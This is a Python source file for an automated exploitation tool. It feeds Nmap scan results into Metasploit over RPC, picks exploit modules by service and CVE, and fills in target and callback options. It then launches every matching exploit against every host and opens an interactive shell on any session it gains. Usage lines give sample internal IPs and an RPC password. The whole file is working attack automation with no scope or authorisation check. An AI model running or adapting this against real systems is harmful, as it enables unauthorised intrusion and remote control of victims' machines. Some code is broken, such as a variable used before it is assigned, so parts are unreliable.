from pymetasploit3.msfrpc import MsfRpcClient, ExploitModule, PayloadModule
from parse_scan import parse_from_json, parse_scan
from scannerd import simple_scan
from sys import argv
from socket import socket
from pprint import pprint
from celery import shared_task
import threading
import json
from datetime import datetime

from models import db, Parsed, Exploit


NOT_TESTED = 'NOT_TESTED'
NO_SHELL = 'NO_SHELL'
ACQUIRED_SHELL = 'ACQUIRED_SHELL'
FAILED = 'FAILED'


class ExploitManager:
    def __init__(self, server_ip: str = None, password: str = None, port: int = None, manager: MsfRpcClient = None):
        """Instantiates an object of the MetasploitManager class."""
        self.server_ip = server_ip
        self.parsed_scan = None
        self.modules = None
        if manager:
            self.manager = manager
        else:
            self.manager = MsfRpcClient(password, ip=server_ip, port=port)

    def load_scan(self, parsed_scan: dict):
        """Loads a new Nmap scan to be analyzed."""
        self.parsed_scan = parsed_scan
        self.modules = {}

    def load_options(self, options: dict):
        """Loads modules to be used to exploit each port."""
        self.modules = options

    def analyze_scan(self) -> dict:
        """Find useful modules from Metasploit manager based on CVE in parsed_scan 
        and fill the missing required option using the information stored in parsed_scan
        
        Returns:
            (dict): Modules found and their respective settings.
        """
        for ip, scan in self.parsed_scan.items():
            if scan["state"] != "up":
                continue
            for port, info in scan["ports"].items():
                if info.get("service"):
                    self.add_module(ip, port, info.get("service"))
                cve_set = info.get("vulner", [])
                for cve in cve_set:
                    self.add_module(ip, port, cve)
        return self.modules

    def add_module(self, ip: str, port: str, vulnerability: str) -> dict:
        """Gets a metasploit module given the target IP, port and a
        vulnerability.
    
        Args:
            ip (str): The IP address of the target machine.
            port(int): The port of the target machine.
            vulnerability (str): The vulnerability to be searched.
        
        Returns:
            (dict): Module found and its settings.
        """
        exploit_list = self.manager.modules.search(vulnerability)
        for exploit in exploit_list:
            if exploit is None:
                continue
            exploit_name = exploit.get("fullname")
            if exploit_name and exploit.get("type") == "exploit":
                exploit = self.manager.modules.use("exploit", exploit_name)

                # Initializes all nested dictionaries for that specific vulnerability if they don't already exist.
                self.modules[ip] = self.modules.get(ip, {})
                self.modules[ip][port] = self.modules[ip].get(port, {})
                self.modules[ip][port][vulnerability] = self.modules[ip][port].get(vulnerability, {})
                self.modules[ip][port][vulnerability]["exploit"] = exploit_name
                self.modules[ip][port][vulnerability]["exploit_description"] = exploit.description
                self.modules[ip][port][vulnerability]["status"] = NOT_TESTED

                if len(vulnerability) > 2 and vulnerability[:3] == "CVE":
                    self.modules[ip][port][vulnerability]["CVE"] = vulnerability

                payloads = exploit.targetpayloads()

                if payloads:
                    self.modules[ip][port][vulnerability]["payload"] = payloads[0]
                    payload = self.manager.modules.use('payload', payloads[0])
                    self.modules[ip][port][vulnerability]["payload_description"] = payload.description

                self.save_options(ip, port, vulnerability, exploit)
                self.save_options(ip, port, vulnerability, payload)

                return self.modules[ip][port][vulnerability]

    def save_options(self, ip: str, port: str, vulnerability: str, module: ExploitModule | PayloadModule):
        """Sets and saves the options for the exploit or payload module on
        the modules attribute.
    
        Args:
            ip (str): The IP address of the target machine.
            port (int): The port of the target machine.
            vulnerability (str): The vulnerability to be searched.
            module (ExploitModule | PayloadModule): The module to be used
        
        Returns:
            (dict): Module found and its settings.
        """
        option_type = 'exploit_options' if isinstance(module, ExploitModule) else 'payload_options'
        self.modules[ip][port][vulnerability][option_type] = self.modules[ip][port][vulnerability].get(option_type, {})
        for option in module.options:
            if option in module.missing_required or option in ["CHOST", "CPORT", "RPORT"]:
                setting = self.fill_option(option, ip, port)
                if setting:
                    self.modules[ip][port][vulnerability][option_type][option] = self.fill_option(option, ip, port)
                else:
                    print(f"Option {option} in module {module.fullname} not configured.")
            elif module[option]:
                self.modules[ip][port][vulnerability][option_type][option] = module[option]

    def fill_option(self, option_name: str, target_ip: str, target_port: str) -> str | int:
        """Choses which passed value to return based on the option name"""
        option = option_name.upper()
        if "RHOST" in option:
            return target_ip
        elif option in ["SRVHOST", "CHOST", "LHOST"]:
            return self.server_ip
        elif option in ["CPORT", "LPORT"]:
            free_sock = socket()
            free_sock.bind(('', 0))
            return free_sock.getsockname()[1]
        elif "RPORT" in option:
            return target_port

    def exploit(self, ip: str, port: int, vulnerability: str) -> dict:
        """Exploits the target given its IP, port and a vulnerability.
    
        Args:
            ip (str): The IP address of the target machine.
            port(int): The port of the target machine.
            vulnerability (str): The code of the vulnerability to be exploited.
        
        Returns:   
            (dict): Information about the exploit job.
        """
        try:
            vuln_info = self.modules[ip][port][vulnerability]
        except KeyError:
            print(f"Vulnerability {vulnerability} of {ip}:{port} not saved.")
            return {}
        num_shells = len(self.manager.sessions.list)
        exploit = self.manager.modules.use("exploit", vuln_info["exploit"])
        for option_name, setting in vuln_info["exploit_options"].items():
            if setting:
                try:
                    exploit[option_name] = setting
                except KeyError:
                    print(f'Option {option_name} in module x not valid.')
        payload_name = vuln_info.get("payload")
        if payload_name:
            payload = self.manager.modules.use("payload", payload_name)
            for option_name, setting in vuln_info["payload_options"].items():
                if setting:
                    try:
                        payload[option_name] = setting
                    except KeyError:
                        print(f'Option {option_name} in module {payload_name} not valid.')
            result = exploit.execute(payload=payload)
        else:
            result = exploit.execute()
        if len(self.manager.sessions.list) > num_shells:
            self.modules[ip][port][vulnerability]["status"] = ACQUIRED_SHELL
        elif result.get('job_id') is None:
            self.modules[ip][port][vulnerability]["status"] = FAILED
        else:
            self.modules[ip][port][vulnerability]["status"] = NO_SHELL
        return result

    def exploit_all(self) -> list:
        """Uses all vulnerabilities on self.modules to exploit all their
        respective targets.

        Returns:
            (list): Result from all exploit jobs
        """
        results = []
        for ip, scan in self.modules.items():
            for port, port_scan in scan.items():
                for vulnerability in port_scan:
                    result = self.exploit(ip, port, vulnerability)
                    results.append(result)
        return results
    
    def print_output(self, shell):
        while True:
            output = shell.read()
            if output:
                print(output)

    def get_shell(self) -> list:
        """Uses all vulnerabilities on self.modules to try to get a shell."""
        results = []
        for ip, scan in self.modules.items():
            for port, port_scan in scan.items():
                for vulnerability in port_scan:
                    result = self.exploit(ip, port, vulnerability)
                    results.append(result)
                    if self.manager.sessions.list:
                        break
        if self.manager.sessions.list:
            index = next(iter(self.manager.sessions.list))
            shell = self.manager.sessions.session(index)
        while self.manager.sessions.list:
            output_thread = threading.Thread(target=self.print_output, args=(shell,))
            output_thread.start()
            user_input = input("$:")
            if user_input == 'quit':
                break


def exploit_job(parsed_scan: dict):
    manager = ExploitManager(argv[2], argv[3], argv[4])
    manager.load_scan(parsed_scan)
    manager.analyze_scan()
    manager.exploit_all()
    return manager.modules


def exploit(parsed_id, scan_id):
    if parsed_id:
        # Gets the Scan from the database
        parsed_scan = Parsed.query.filter_by(id=parsed_id).first()

        # Creates the Exploit object in the database
        loaded_parsed = json.loads(parsed_scan.scan_data)
        ip = next(iter(loaded_parsed))
        start_time = datetime.now()
        exploit = Exploit(ip=ip, start_time=start_time, status='running')
        db.session.add(exploit)
        db.session.commit()

        # Runs exploits
        exploit_results = exploit_job(loaded_parsed)

        # Updates the Exploit object in the database
        exploit.exploit_data = exploit_results
        exploit.status = 'complete'
        exploit.end_time = datetime.now()
        db.session.add(exploit)
        db.session.commit()
        return exploit.id, scan_id
    return None, None


def load_json(file_path: str) -> dict | list:
    """Loads the file located at the given path.
    Args:
        (str): Path of the file to be loaded
    Returns:
        (dict | list): Object with contents of the loaded JSON file
    """
    try:
        with open(file_path, "r") as json_file:
            return json.load(json_file)
    except FileNotFoundError:
        print(f"File {file_path} does not exist")
        exit(1)

def main():
    if argv[1] == 'scan':
        parsed_scan = parse_from_json(argv[2])
    elif argv[1] == 'parsed':
        parsed_scan = load_json(argv[2])
    elif argv[1] == 'ip':
        load_json(scan_data)
        scan_data = simple_scan(argv[2])
        parsed_scan = parse_scan(scan_data)
    else:
        print("Available input types: parsed | scan | ip")
        exit(1)
    manager = ExploitManager(argv[3], argv[4], argv[5])
    manager.load_scan(parsed_scan)
    manager.analyze_scan()
    print('\nExploit Results')
    pprint(manager.exploit_all())
    print('\nModules Used:')
    pprint(manager.modules)
    print('\nSessions Acquired:')
    pprint(manager.manager.sessions.list)
    manager.get_shell()


if __name__ == "__main__":
    if len(argv) < 6:
        print("Usage: py exploit.py [input_type] [input] [scan_file] [server_ip] [msf_password] [msf_port]")
        print("\te.g. py exploit.py parsed seed/scan_parser/10.10.0.14.json 10.10.0.13 NEl5ln9A 55552")
        print("\te.g. py exploit.py scan seed/nmap/10.10.0.14.json 10.10.0.13 NEl5ln9A 55552")
        print("\te.g. py exploit.py ip 10.10.0.14 10.10.0.13 NEl5ln9A 55552")
        exit(1)
    main()
